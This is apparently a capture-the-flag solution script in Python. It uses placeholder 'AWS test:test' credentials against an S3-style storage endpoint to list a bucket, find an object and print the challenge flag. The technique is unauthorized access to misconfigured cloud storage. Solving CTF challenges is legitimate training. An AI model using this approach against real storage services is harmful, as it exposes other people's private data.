import requests
import xml.etree.ElementTree as ET

url = "https://trust-issues.csd.lol/"

# get bucket
res = requests.get(url, headers={ 'Authorization': "AWS test:test" })

bucket = ET.fromstring(res.text).find('.//Bucket').find('.//Name').text

# get wishlist
res = requests.get(f'{url}/{bucket}')

wishlist = ET.fromstring(res.text).find('.//Contents').find('.//Key').text

# get flag
res = requests.get('/'.join([url, bucket, wishlist]))
print("Flag:", res.text.strip())